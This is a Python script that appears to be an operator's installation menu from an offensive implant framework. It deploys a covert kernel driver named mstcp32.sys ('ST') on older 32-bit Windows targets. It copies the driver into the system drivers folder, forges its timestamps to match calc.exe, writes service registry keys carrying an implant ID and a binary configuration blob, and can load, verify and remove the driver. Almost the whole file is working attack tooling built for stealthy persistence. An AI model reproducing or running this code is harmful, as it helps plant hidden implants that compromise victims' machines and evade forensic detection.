
import ops, ops.menu, ops.data, ops.cmd
import dsz, dsz.ui, dsz.version, dsz.windows
import os.path
from random import randint
stVersion = '1.14'

def getimplantID():
    id = int(randint(0, 4294967295L))
    return id

def regadd(regaddcommand):
    value = None
    if ('value' in regaddcommand.optdict):
        value = regaddcommand.optdict['value']
    else:
        value = regaddcommand.optdict['key']
    (safe, reason) = regaddcommand.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the registryadd command (for value %s) because of a failed safety check: \n%s' % (value, reason)), dsz.ERROR)
        return 0
    regaddres = regaddcommand.execute()
    if regaddcommand.success:
        dsz.ui.Echo(('Successfully added %s key.' % value), dsz.GOOD)
        return 1
    else:
        dsz.ui.Echo(('Failed to add %s key!' % value), dsz.ERROR)
        return 0

def install(passed_menu=None):
    optdict = passed_menu.all_states()
    if verifyinstalled(passed_menu):
        dsz.ui.Echo('ST looks like it is already installed!', dsz.ERROR)
        return 0
    drivername = optdict['Configuration']['Driver Name']
    implantID = optdict['Configuration']['Implant ID']
    dsz.ui.Echo(('==Installing %s==' % drivername), dsz.WARNING)
    localdriverpath = os.path.join(ops.RESDIR, 'ST1.14', 'mstcp32.sys')
    if verifydriver(passed_menu):
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    else:
        putcmd = ops.cmd.getDszCommand(('put %s -name %s -permanent' % (localdriverpath, os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))))
        (safe, reason) = putcmd.safetyCheck()
        if (not safe):
            dsz.ui.Echo(('Cannot execute the put command because of a failed safety check: \n%s' % reason), dsz.ERROR)
            if (not dsz.ui.Prompt('Do you wish to continue?', False)):
                return 0
        putres = putcmd.execute()
        if putcmd.success:
            dsz.ui.Echo(('Successfully put ST up as %s.' % drivername), dsz.GOOD)
        else:
            dsz.ui.Echo(('Put of ST as %s failed!' % drivername), dsz.ERROR)
            if (not dsz.ui.Prompt('Do you wish to continue?', False)):
                return 0
    matchfiletimescmd = ops.cmd.getDszCommand('matchfiletimes', src=os.path.join(dsz.path.windows.GetSystemPath(), 'calc.exe'), dst=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
    (safe, reason) = matchfiletimescmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the matchfiletimes command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    matchfiletimesres = matchfiletimescmd.execute()
    if matchfiletimescmd.success:
        dsz.ui.Echo('Successfully matchfiletimes ST against calc.exe.', dsz.GOOD)
    else:
        dsz.ui.Echo('Failed to matchfiletimes ST against calc.exe!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername)))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='ErrorControl', type='REG_DWORD', data='0'))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Start', type='REG_DWORD', data='2'))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Type', type='REG_DWORD', data='1'))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Options', type='REG_BINARY', data='"0a 00 00 00 40 01 00 00 06 00 00 00 21 00 00 00 04 00 00 00 00 02 00 00 01 00 00 00 21 00 00 00 00 00 00 00 06 04 00 00 cb 34 00 00 00 07 00 00 00 00 00 00 21 00 00 00 00 00 00 00 06 04 00 00 34 cb 00 00 20 05 0a 00 01 00 00 00 00 06 00 00 01 00 00 00"'))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not regadd(ops.cmd.getDszCommand('registryadd', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Params', type='REG_DWORD', data=('"0x%08x"' % implantID)))):
        dsz.ui.Echo('Failed to add key, verify installation!', dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not verifyinstalled(passed_menu)):
        dsz.ui.Echo('ST failed to install properly!', dsz.ERROR)
        return 0
    else:
        dsz.ui.Echo("ST installed properly! Don't forget to load the driver, if necessary.", dsz.GOOD)
        return 1

def uninstall(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    dsz.ui.Echo(('==Uninstalling %s==' % drivername), dsz.WARNING)
    if (not verifyinstalled(passed_menu)):
        dsz.ui.Echo("ST doesn't seem to be properly installed!", dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if verifyrunning(passed_menu):
        dsz.ui.Echo('ST running, attempting to unload.')
        if (not unload(passed_menu)):
            dsz.ui.Echo('Could not unload ST!', dsz.ERROR)
            if (not dsz.ui.Prompt('Do you wish to continue?', False)):
                return 0
        else:
            dsz.ui.Echo('Successfully unload ST', dsz.GOOD)
    deletecmd = ops.cmd.getDszCommand('delete', file=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
    (safe, reason) = deletecmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the delete command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    deleteres = deletecmd.execute()
    if (not deletecmd.success):
        dsz.ui.Echo(('Could not delete ST driver (%s)!.' % drivername), dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    else:
        dsz.ui.Echo(('Delete of ST driver (%s) successful.' % drivername), dsz.GOOD)
    regdelcmd = ops.cmd.getDszCommand('registrydelete', hive='l', key=('system\\CurrentControlSet\\Services\\%s' % drivername), recursive=True)
    (safe, reason) = regdelcmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the registrydelete command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    regdelres = regdelcmd.execute()
    if (not regdelcmd.success):
        dsz.ui.Echo('Could not delete the ST registry keys!.', dsz.ERROR)
    else:
        dsz.ui.Echo('Delete of ST registry keys successful.', dsz.GOOD)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    if (not verifyinstalled(passed_menu)):
        dsz.ui.Echo('ST successfully uninstalled!', dsz.GOOD)
        return 1
    else:
        dsz.ui.Echo('ST uninstall failed!', dsz.ERROR)
        return 0

def load(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    dsz.ui.Echo(('==Loading %s==' % drivername), dsz.WARNING)
    drivercmd = ops.cmd.getDszCommand('drivers', load=drivername)
    (safe, reason) = drivercmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the load command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        return 0
    driverres = drivercmd.execute()
    if (not drivercmd.success):
        dsz.ui.Echo(('Driver %s was NOT successfully loaded!' % drivername), dsz.ERROR)
        return 0
    else:
        dsz.ui.Echo(('Driver %s was successfully loaded!' % drivername), dsz.GOOD)
        return 1
    verifyrunning(passed_menu)

def unload(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    dsz.ui.Echo(('==Unloading %s==' % drivername), dsz.WARNING)
    drivercmd = ops.cmd.getDszCommand('drivers', unload=drivername)
    (safe, reason) = drivercmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the unload command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        return 0
    driverres = drivercmd.execute()
    if (not drivercmd.success):
        dsz.ui.Echo(('Driver %s was NOT successfully unloaded!' % drivername), dsz.ERROR)
        return 0
    else:
        dsz.ui.Echo(('Driver %s was successfully unloaded!' % drivername), dsz.GOOD)
        return 1
    verifyrunning(passed_menu)

def verifydriver(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    dsz.ui.Echo(('==Checking to see driver %s exists on disk==' % drivername), dsz.WARNING)
    permissionscmd = ops.cmd.getDszCommand('permissions', file=os.path.join(dsz.path.windows.GetSystemPath(), 'drivers', ('%s.sys' % drivername)))
    (safe, reason) = permissionscmd.safetyCheck()
    if (not safe):
        dsz.ui.Echo(('Cannot execute the permissions command because of a failed safety check: \n%s' % reason), dsz.ERROR)
        if (not dsz.ui.Prompt('Do you wish to continue?', False)):
            return 0
    permissionsres = permissionscmd.execute()
    if (not permissionscmd.success):
        dsz.ui.Echo(("ST driver (%s) doesn't exist!" % drivername), dsz.ERROR)
        return 0
    else:
        dsz.ui.Echo(('ST driver (%s) exists.' % drivername), dsz.GOOD)
        return 1

def verifyinstalled(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    verifydriver(passed_menu)
    returnvalue = 1
    dsz.ui.Echo(('==Checking to see if all reg keys for %s exist==' % drivername), dsz.WARNING)
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername))
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("Driver key doesn't exist", dsz.ERROR)
        return 0
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='ErrorControl')
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("ErrorControl key doesn't exist", dsz.ERROR)
        returnvalue = 0
    elif (not (regres.key[0].value[0].value == '0')):
        dsz.ui.Echo('ErrorControl key not set correctly', dsz.ERROR)
        returnvalue = 0
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Start')
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("Start key doesn't exist", dsz.ERROR)
        returnvalue = 0
    elif (not (regres.key[0].value[0].value == '2')):
        dsz.ui.Echo('Start key not set correctly', dsz.ERROR)
        returnvalue = 0
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Type')
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("Type key doesn't exist", dsz.ERROR)
        returnvalue = 0
    elif (not (regres.key[0].value[0].value == '1')):
        dsz.ui.Echo('Type key not set correctly', dsz.ERROR)
        returnvalue = 0
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Options')
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("Options key doesn't exist", dsz.ERROR)
        returnvalue = 0
    elif (not (regres.key[0].value[0].value == '0a000000400100000600000021000000040000000002000001000000210000000000000006040000cb340000000700000000000021000000000000000604000034cb000020050a00010000000006000001000000')):
        dsz.ui.Echo('Options key not set correctly', dsz.ERROR)
        returnvalue = 0
    regcmd = ops.cmd.getDszCommand('registryquery', hive='L', key=('system\\CurrentControlSet\\Services\\%s' % drivername), value='Params')
    regres = regcmd.execute()
    if (regcmd.success == 0):
        dsz.ui.Echo("Params key doesn't exist", dsz.ERROR)
        returnvalue = 0
    else:
        installedImplantID = regres.key[0].value[0].value
        dsz.ui.Echo(('ST implant ID (Params): %s' % installedImplantID), dsz.GOOD)
    if returnvalue:
        dsz.ui.Echo('All ST keys exist with expected values', dsz.GOOD)
    else:
        dsz.ui.Echo('Some ST keys were missing or had unexpected values', dsz.ERROR)
    return returnvalue

def verifyrunning(passed_menu=None):
    optdict = passed_menu.all_states()
    drivername = optdict['Configuration']['Driver Name']
    dsz.ui.Echo(('==Checking to see if %s is running==' % drivername), dsz.WARNING)
    if dsz.windows.driver.VerifyRunning(drivername):
        dsz.ui.Echo('ST driver running.', dsz.GOOD)
        return 1
    else:
        dsz.ui.Echo('ST driver NOT running!', dsz.ERROR)
        return 0

def main():
    ops.preload('registryquery')
    ops.preload('drivers')
    ops.preload('put')
    ops.preload('matchfiletimes')
    ops.preload('registryadd')
    ops.preload('registrydelete')
    ops.preload('delete')
    if (not dsz.version.checks.windows.Is2000OrGreater()):
        dsz.ui.Echo('Target is pre Windows 2000! Cannot install, educate yourself', dsz.ERROR)
        return 0
    if dsz.version.checks.IsOs64Bit():
        dsz.ui.Echo('Target is x64! Cannot install, educate yourself', dsz.ERROR)
        return 0
    if dsz.version.checks.windows.IsVistaOrGreater():
        dsz.ui.Echo('Target is Vista+! Cannot install, educate yourself', dsz.ERROR)
        return 0
    st_menu = ops.menu.Menu()
    implantid = getimplantID()
    drivername = 'mstcp32'
    st_menu.set_heading(('ST %s installation menu' % stVersion))
    st_menu.add_str_option(option='Driver Name', section='Configuration', state=drivername)
    st_menu.add_hex_option(option='Implant ID', section='Configuration', state=implantid)
    st_menu.add_option(option='Install Driver', section='Installation', callback=install, passed_menu=st_menu)
    st_menu.add_option(option='Load Driver', section='Installation', callback=load, passed_menu=st_menu)
    st_menu.add_option(option='Verify Installation', section='Installation', callback=verifyinstalled, passed_menu=st_menu)
    st_menu.add_option(option='Verify Running', section='Installation', callback=verifyrunning, passed_menu=st_menu)
    st_menu.add_option(option='Uninstall ST', section='Uninstall', callback=uninstall, passed_menu=st_menu)
    st_menu.add_option(option='Unload Driver', section='Uninstall', callback=unload, passed_menu=st_menu)
    st_menu.execute(exiton=[0], default=0)
if (__name__ == '__main__'):
    try:
        main()
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)